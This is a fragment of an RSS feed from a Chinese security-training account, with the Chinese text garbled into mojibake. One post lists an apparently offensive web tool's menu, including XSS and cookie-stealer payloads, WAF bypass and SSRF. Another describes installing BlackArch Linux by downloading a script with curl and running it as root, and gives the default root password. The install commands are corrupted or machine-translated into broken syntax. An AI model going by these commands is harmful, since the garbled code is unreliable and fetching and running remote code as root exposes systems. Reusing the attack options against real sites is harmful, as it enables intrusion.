src=&quot;https://pic1.zhimg.com/v2-5911ced1a9d1b1c36b3f58ad399b9f80_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;873&quot; data-rawheight=&quot;684&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;873&quot; data-original=&quot;https://pic1.zhimg.com/v2-5911ced1a9d1b1c36b3f58ad399b9f80_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-5911ced1a9d1b1c36b3f58ad399b9f80_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;873&quot; data-rawheight=&quot;684&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;873&quot; data-original=&quot;https://pic1.zhimg.com/v2-5911ced1a9d1b1c36b3f58ad399b9f80_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-5911ced1a9d1b1c36b3f58ad399b9f80_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;è§†é¢‘å®‰è£…æ•™ç¨‹ï¼š&lt;/b&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//youtu.be/93ws50zYqVE&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;youtu.be/93ws50zYqVE&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;h2&gt;å‘½ä»¤é€‰é¡¹&lt;/h2&gt;&lt;blockquote&gt;[1]å®¡æ ¸HTTPæ–¹æ³•&lt;br/&gt;[2]æå–å“åº”æ ‡å¤´&lt;br/&gt;[3]æå–å›¾åƒ&lt;br/&gt;[4]æå–URL&lt;br/&gt;[5]è¯†åˆ«è¡¨å•&lt;br/&gt;[6]åœ¨è¡¨å•é«˜çº§æ”»å‡»ä¸­æŸ¥æ‰¾XSS &lt;br/&gt;[7]åœ¨è¡¨å•ç®€å•æ”»å‡»ä¸­æŸ¥æ‰¾XSS&lt;br/&gt;[8] WebæœåŠ¡å™¨æŒ‚è½½å“åº”æ‹†åˆ†æ”»å‡»&lt;br/&gt;[9]æ ‡å¤´æ³¨å…¥æ¯’è¯&lt;br/&gt;[10]é«˜é€Ÿç¼“å­˜æ¯’è¯&lt;br/&gt;[11] CRLFå“åº”æ‹†åˆ†æ”»å‡»å’Œæ¨¡ç³Šå™¨&lt;br/&gt;[12] HTTPå“åº”èµ°ç§æ¨¡ç³Š&lt;br/&gt;[13] Webç¼“å­˜æ¬ºéª—æ”»å‡»æ£€æŸ¥&lt;br/&gt;[14] HTTPæ–¹æ³•ä¿¡æ¯&lt;br/&gt;[15]è‡ªå®šä¹‰CSRFæ³¨å…¥è¯·æ±‚&lt;br/&gt;[16]åŠ è½½CSRF HTMLæ¨¡æ¿&lt;br/&gt;[17] Shell Shock&lt;br/&gt;[18]è·¨ç«™ç‚¹è¯·æ±‚ä¼ªé€ å®¡æ ¸å·¥å…·åŒ…&lt;br/&gt;[19]æŸ¥æ‰¾å¯ç”¨çš„HTTPæ–¹æ³•&lt;br/&gt;[20]ä½¿ç”¨å°–å«çœ¼é•œè›‡åœ¨å‚æ•°ä¸­æŸ¥æ‰¾XSS&lt;br/&gt;[21]æŸ¥æ‰¾ç¼ºå°‘çš„HTTPSæ–¹æ³•&lt;br/&gt;[22]æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ &lt;br/&gt;[23]æŸ¥æ‰¾å¯ç”¨çš„HTTPSæ–¹æ³•&lt;br/&gt;[24]å®¡æ ¸XML RPCæ–¹æ³•ï¼Œæå–æ‰€æœ‰ä¿¡æ¯&lt;br/&gt;[25] Cookie Stealer XSS LocalhostæœåŠ¡å™¨&lt;br/&gt;[26]å‘½ä»¤æ³¨å…¥æ¼æ´&lt;br/&gt;[27]æ˜¾ç¤ºJSONç«¯ç‚¹åˆ—è¡¨ &lt;br/&gt;[28]æ‰§è¡Œç›²æ³¨ï¼Œç¼–ç çš„å“åº”å¼XXEæ³¨å…¥ &lt;br/&gt;[29]æ‰§è¡Œæ–‡ä»¶ä¸Šä¼ æ³¨å…¥ &lt;br/&gt;[30]æ‰§è¡Œä¾§é¢æ¨¡æ¿æ³¨å…¥ &lt;br/&gt;[31]æ‰§è¡ŒJSON Webä»¤ç‰Œæ³¨å…¥ &lt;br/&gt;[32]æ‰§è¡ŒWebå¥—æ¥å­—æ³¨å…¥ &lt;br/&gt;[33]æ‰§è¡ŒAmazon Bucket Injection 101 AWSäºšé©¬é€Š&lt;br/&gt;[34]æå–è¦åŠ«æŒçš„Cnamesè®°å½• &lt;br/&gt;[35]ä¸å®‰å…¨çš„ç›´æ¥å¯¹è±¡å‚è€ƒâ€“ BURP &lt;br/&gt;[36]æ‰§è¡ŒCSVæ³¨å…¥ &lt;br/&gt;[37]æ‰§è¡ŒXPATHæ³¨å…¥ &lt;br/&gt;[38]æŸ¥æ‰¾SQLï¼ŒXPATHï¼ŒASPï¼ŒXï¼ŒJAVAï¼ŒJAVASCRIPTï¼ŒPHPé”™è¯¯ &lt;br/&gt;[39]æŸ¥æ‰¾XPathå’ŒSQLå‚æ•°æ³¨å…¥ &lt;br/&gt;[40]æ˜¾ç¤ºä¸¤ä¸ªèº«ä»½éªŒè¯æœ‰æ•ˆè½½è· &lt;br/&gt;[41]çªå˜çš„XSSæœ‰æ•ˆè½½è· &lt;br/&gt;[42]å­˜å‚¨çš„XSSæœ‰æ•ˆè½½è· &lt;br/&gt;[43]åå°„çš„XSSæœ‰æ•ˆè½½è· &lt;br/&gt;[44] Wafæ—è·¯æœ‰æ•ˆè½½è· &lt;br/&gt;[45]ä½¿ç”¨å“åº”åˆ†å‰²æŸ¥æ‰¾XSS &lt;br/&gt;[46]æå–é“¾æ¥â€“é«˜çº§ &lt;br/&gt;[47]ä¸‹è½½å›¾åƒâ€“ Exifæ•°æ® &lt;br/&gt;[48]ç®€å•å“åº”æ‹†åˆ†æ”»å‡» &lt;br/&gt;[49]åŒå“åº”æ‹†åˆ†æ”»å‡» &lt;br/&gt;[50] HTTPç¼“å­˜ä¸­æ¯’æ”»å‡» &lt;br/&gt;[51] HTTPç¼“å­˜æ³¨å…¥ä¸­æ¯’ &lt;br/&gt;[52] HTTP Fuzzer &lt;br/&gt;[53] IPæ··æ·† &lt;br/&gt;[54] RFI &lt;br/&gt;[55] LFI &lt;br/&gt;[56]äºŒè¿›åˆ¶ç¼“å†²åŒºæº¢å‡ºæŸ¥æ‰¾å™¨ &lt;br/&gt;[57]å­˜å‚¨å’Œåæ˜ çš„XSS Angular JSæœ‰æ•ˆ è´Ÿè½½&lt;br/&gt;[58] Phantom JS XSSæœ‰æ•ˆè´Ÿè½½å¸®åŠ©ç¨‹åº &lt;br/&gt;[59] Agular JSå®¢æˆ·ç«¯è‡ªåŠ¨XSSæŸ¥æ‰¾å™¨ &lt;br/&gt;[60]ä¼šè¯åŠ«æŒ æ‰“æ‰°æ–¹æ³•&lt;br/&gt;[61] OAUTHæ³¨å…¥ &lt;br/&gt;[62]ä½¿ç”¨DNSå†å²è®°å½•ç»•è¿‡é˜²ç«å¢™ &lt;br/&gt;[0]é€€å‡º&lt;/blockquote&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;äºŒå‘ç®”å®‰å…¨&lt;/a&gt;çš„ç½‘ç»œå®‰å…¨æŠ€èƒ½åŒ…æ›´æ–°äº†ï¼CISP-PTE è®¤è¯æŠ€èƒ½åŒ…ï¼Œè®©ä½ å…è´¹ä½“éªŒ CISP-PTE è®¤è¯å†…å®¹ã€‚&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3058&quot; data-original=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3058&quot; data-original=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;æ›´å¤šæœ‰å…³æ¸—é€æµ‹è¯•çš„å†…å®¹è¯·å‰å¾€&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;äºŒå‘ç®”å®‰å…¨&lt;/a&gt;è¿›è¡Œå­¦ä¹ ï¼Œæœ€è¿‘æ¨å‡ºäº†â€œæŒ–æ´â€ç­ï¼Œæƒ³äº†è§£æ›´å¤šèµ„è®¯çš„ï¼Œå¯å’¨è¯¢å®¢æœå¾®ä¿¡ &lt;b&gt;twosecurity02&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot;/&gt;&lt;/figure&gt;</description>
<author>äºŒå‘ç®”å®‰å…¨å­¦é™¢</author>
<guid isPermaLink="false">2020-01-15-102917681</guid>
<pubDate>Wed, 15 Jan 2020 00:00:00 +0800</pubDate>
</item>
<item>
<title>é›†ä¸Šåƒç§å·¥å…·äºä¸€ä½“ï¼šBlackArch Linuxï¼ˆ2020æœ€æ–°ç‰ˆï¼‰</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2020-01-14-102716285.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/102716285&quot;&gt;åŸæ–‡&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-cedfb1007dcb813ed8c4bdc300b6fd00_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;BlackArch Linux æ˜¯ä¸€ä¸ªåŸºäº Arch Linux çš„æ¸—é€æµ‹è¯•å‘è¡Œç‰ˆï¼Œé¢å‘æ¸—é€æµ‹è¯•äººå‘˜å’Œå®‰å…¨ç ”ç©¶äººå‘˜ã€‚å­˜å‚¨åº“åŒ…å«2428ä¸ªå·¥å…·ã€‚å¯ä»¥å•ç‹¬æˆ–æˆç»„å®‰è£…å·¥å…·ã€‚BLACKARS Linuxä¸ç°æœ‰çš„Archå®‰è£…å…¼å®¹ã€‚&lt;/p&gt;&lt;p&gt;å®˜ç½‘ï¼š&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//blackarch.org/tools.html&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;blackarch.org/tools.htm&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt; &lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-383bce9eee7869086d51a3b97b3bb2e3_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1500&quot; data-rawheight=&quot;800&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1500&quot; data-original=&quot;https://pic4.zhimg.com/v2-383bce9eee7869086d51a3b97b3bb2e3_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-383bce9eee7869086d51a3b97b3bb2e3_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1500&quot; data-rawheight=&quot;800&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1500&quot; data-original=&quot;https://pic4.zhimg.com/v2-383bce9eee7869086d51a3b97b3bb2e3_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-383bce9eee7869086d51a3b97b3bb2e3_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h2&gt;BlackArch Linux 2020ç‰ˆ&lt;/h2&gt;&lt;p&gt;åƒ kali ä¸€æ ·ï¼Œè®©æ¸—é€æµ‹è¯•äººå‘˜ä¸“å¿ƒå¹²äº‹æƒ…çš„å·¥å…·é›†ï¼Œç´¯è®¡ 2400+ å·¥å…·ï¼Œå‡ ä¹æ»¡è¶³æ—¥å¸¸ä»»ä½•æ¸—é€éœ€æ±‚ã€‚ï¼ˆå…¶ç›®æ ‡å°±æ˜¯å–å¸¦ kali æˆä¸ºæ–°ä¸€ä»£ä¼ å¥‡ï¼Œå½“ç„¶ï¼Œç›®å‰æ˜¾ç„¶è¶…è¶Šäº†è¯¸å¦‚Kali Linuxä¹‹ç±»çš„ç³»ç»Ÿï¼‰&lt;/p&gt;&lt;p&gt;&lt;b&gt;ä¸‹è½½&lt;/b&gt;&lt;/p&gt;&lt;ol&gt;&lt;li&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//mirrors.tuna.tsinghua.edu.cn/blackarch/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;httpsï¼š// mirrors .tuna.tsinghua.edu.cn / blackarch /&lt;/a&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;2. &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//mirrors.ustc.edu.cn/blackarch/&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;mirrors.ustc.edu.cn/bla&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;ckarch/&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;æ›´æ–°å†…å®¹&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;å¢åŠ äº† 120 ä¸ªæ–°å·¥å…·&lt;/li&gt;&lt;li&gt;å‘ lxdm æ·»åŠ ç»ˆç«¯å­—ä½“æ”¯æŒ&lt;/li&gt;&lt;li&gt;ä¿®æ­£äº†â€œæ— æ³•é€šè¿‡èœå•æ‰“å¼€å·¥å…·â€çš„ bug&lt;/li&gt;&lt;li&gt;å°† blackarch å®‰è£…ç¨‹åºæ›´æ–°ä¸º v1.1.34&lt;/li&gt;&lt;li&gt;åŒ…æ‹¬ linux å†…æ ¸ 5.4.6&lt;/li&gt;&lt;li&gt;æ›´æ–°çš„ urxvt é…ç½®ï¼šæ·»åŠ å¯¹åŠ¨æ€æ›´æ”¹å¤§å°çš„æ”¯æŒ&lt;/li&gt;&lt;li&gt;ç”¨ Vundle.vim æ›¿æ¢ vimã€‚æ·»åŠ äº†æ–°çš„ vim æ’ä»¶ï¼šclang_complete&lt;/li&gt;&lt;li&gt;å¯¹æ‰€æœ‰åŒ…è¿›è¡Œäº†è´¨é‡ä¿è¯å’Œä¿®å¤ï¼ˆè¿è¡Œæ—¶æ‰§è¡Œï¼‰&lt;/li&gt;&lt;li&gt;æ›´æ–°äº†æ‰€æœ‰ blackarch å·¥å…·å’ŒåŒ…ï¼ŒåŒ…æ‹¬é…ç½®æ–‡ä»¶&lt;/li&gt;&lt;li&gt;æ›´æ–°äº†æ‰€æœ‰ç³»ç»ŸåŒ…&lt;/li&gt;&lt;li&gt;æ›´æ–°äº†æ‰€æœ‰çª—å£ç®¡ç†å™¨èœå•ï¼ˆawesomeã€fluxboxã€openboxï¼‰&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;b&gt;å®‰è£…ï¼ˆåœ¨ArchLinuxä¹‹ä¸Šå®‰è£…ï¼‰&lt;/b&gt;&lt;/p&gt;&lt;p&gt;å®ƒå……å½“éå®˜æ–¹çš„ç”¨æˆ·å­˜å‚¨åº“ã€‚&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;ï¼ƒä»¥ root èº«ä»½è¿è¡Œ https://blackarch.org/strap.sh å¹¶æŒ‰ç…§è¯´æ˜è¿›è¡Œæ“ä½œã€‚
$ curl -O https://blackarch.org/strap.sh ï¼ƒSHA1çš„æ€»å’Œåº”è¯¥åŒ¹é…ï¼š9f770789df3b7803105e5fbc19212889674cd503trap.sh
$ sha1sumtrap.sh ï¼ƒè®¾ç½®æ‰§è¡Œ
$ chmod + xtrap.sh ï¼ƒè¿è¡Œtrap.sh
$ sudo ./strap.sh&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç°åœ¨å¯ä»¥ä» blackarch å­˜å‚¨åº“å®‰è£…å·¥å…·ã€‚&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;ï¼ƒè¦åˆ—å‡ºæ‰€æœ‰å¯ç”¨å·¥å…·ï¼Œè¯·è¿è¡Œ
$ sudo pacman -Sgg | grep blackarch | åˆ‡-d&amp;#39;&amp;#39;-f2 | æ’åº-uï¼ƒè¦å®‰è£…æ‰€æœ‰å·¥å…·ï¼Œè¯·è¿è¡Œ
$ sudo pacman -S blackarchï¼ƒè¦å®‰è£…ä¸€ç±»å·¥å…·ï¼Œè¯·è¿è¡Œ
$ sudo pacman -S blackarch- &amp;lt;ç±»åˆ«&amp;gt;ï¼ƒè¦æŸ¥çœ‹blackarchç±»åˆ«ï¼Œè¯·è¿è¡Œ
$ sudo pacman -Sg | grep blackarch
ï¼ƒæ³¨æ„-å®‰è£…blackarchå·¥å…·æ—¶ï¼Œå¯èƒ½æœ‰å¿…è¦è¦†ç›–æŸäº›è½¯ä»¶åŒ…ã€‚å¦‚æœ
ï¼ƒé‡åˆ°â€œfailed to commit transactionâ€é”™è¯¯ï¼Œè¯·ä½¿ç”¨--neededå’Œ--overwriteå¼€å…³
ï¼ƒä¾‹å¦‚ï¼š
sudo pacman -Syyu --needed blackarch --overwrite=&amp;#39;*&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä½œä¸ºæ›¿ä»£å®‰è£…æ–¹æ³•çš„ä¸€éƒ¨åˆ†ï¼Œæ‚¨å¯ä»¥ä»æºä»£ç æ„å»ºblackarchè½¯ä»¶åŒ…ã€‚å¯ä»¥åœ¨githubä¸Šæ‰¾åˆ°PKGBUILD ã€‚&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/BlackArch/blackarch&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/BlackArch/bl&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;ackarch&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;ï¼ƒé¦–å…ˆï¼Œæ‚¨å¿…é¡»å®‰è£… blackmanã€‚å¦‚æœæ‚¨çš„è®¡ç®—æœºä¸Šå®‰è£…äº† BlackArch è½¯ä»¶åŒ…å­˜å‚¨åº“ï¼Œåˆ™
ï¼ƒæ‚¨å¯ä»¥åƒè¿™æ ·å®‰è£… blackmanï¼š
$ sudo pacman -Så¸ƒè±å…‹æ›¼ï¼ƒä¸‹è½½ï¼Œç¼–è¯‘å’Œå®‰è£…è½¯ä»¶åŒ…ï¼š
$ sudo blackman -i &amp;lt;ç¨‹åºåŒ…&amp;gt;ï¼ƒä¸‹è½½ï¼Œç¼–è¯‘å’Œå®‰è£…æ•´ä¸ªç±»åˆ«
$ sudo blackman -g &amp;lt;ç»„&amp;gt;ï¼ƒä¸‹è½½ï¼Œç¼–è¯‘å’Œå®‰è£…æ‰€æœ‰BlackArchå·¥å…·
$ sudo blackman -aï¼ƒåˆ—å‡ºblackarchç±»åˆ«
$ blackman -lï¼ƒåˆ—å‡ºç±»åˆ«å·¥å…·
$ blackman -p &amp;lt;ç±»åˆ«&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;ISOä¸Šå®‰è£…&lt;/b&gt;&lt;/p&gt;&lt;p&gt;å¯ä»¥ä½¿ç”¨ Live æˆ– Netinstall ä»‹è´¨å®‰è£… BlackArch Linuxï¼ˆç¨‹åºåŒ…å’Œç¯å¢ƒï¼‰ã€‚&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;ï¼ƒå®‰è£… blackarch-install-scripts è½¯ä»¶åŒ…
$ sudo pacman -S blackarch-install-scriptsï¼ƒç°åœ¨ï¼Œæ‚¨å¯ä»¥è¿è¡Œå¹¶æŒ‰ç…§è¯´æ˜è¿›è¡Œæ“ä½œ
$ sudo blackarch å®‰è£…&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¯¦ç»†å®‰è£…ï¼š&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//blackarch.org/blackarch-install.html&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;blackarch.org/blackarch&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;-install.html&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;VMå®‰è£…æ•™ç¨‹&lt;/b&gt;ï¼š&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//thewhiteh4t.github.io/2020/01/03/How-to-Install-BlackArch-Linux-in-VMWare-Workstation-15.html&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;thewhiteh4t.github.io/2&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;020/01/03/How-to-Install-BlackArch-Linux-in-VMWare-Workstation-15.html&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;å®Œæ•´å·¥å…·åˆ—è¡¨&lt;/b&gt;ï¼š&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//blackarch.org/tools.html&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;blackarch.org/tools.htm&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-bd3fa8e0c2b21d82fb07ee8a352137bd_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1168&quot; data-rawheight=&quot;1051&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1168&quot; data-original=&quot;https://pic2.zhimg.com/v2-bd3fa8e0c2b21d82fb07ee8a352137bd_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-bd3fa8e0c2b21d82fb07ee8a352137bd_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1168&quot; data-rawheight=&quot;1051&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1168&quot; data-original=&quot;https://pic2.zhimg.com/v2-bd3fa8e0c2b21d82fb07ee8a352137bd_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-bd3fa8e0c2b21d82fb07ee8a352137bd_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;å®‰è£…åçš„é»˜è®¤å¸å·å¯†ç &lt;/b&gt;&lt;/p&gt;&lt;p&gt;å¸å·ï¼šroot&lt;/p&gt;&lt;p&gt;å¯†ç ï¼šblackarch&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;äºŒå‘ç®”å®‰å…¨&lt;/a&gt;çš„ç½‘ç»œå®‰å…¨æŠ€èƒ½åŒ…æ›´æ–°äº†ï¼CISP-PTE è®¤è¯æŠ€èƒ½åŒ…ï¼Œè®©ä½ å…è´¹ä½“éªŒ CISP-PTE è®¤è¯å†…å®¹ã€‚&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3058&quot; data-original=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3058&quot; data-original=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;æ›´å¤šæœ‰å…³æ¸—é€æµ‹è¯•çš„å†…å®¹è¯·å‰å¾€&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;äºŒå‘ç®”å®‰å…¨&lt;/a&gt;è¿›è¡Œå­¦ä¹ ï¼Œæœ€è¿‘æ¨å‡ºäº†â€œæŒ–æ´â€ç­ï¼Œæƒ³äº†è§£æ›´å¤šèµ„è®¯çš„ï¼Œå¯å’¨è¯¢å®¢æœå¾®ä¿¡ &lt;b&gt;twosecurity02&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; 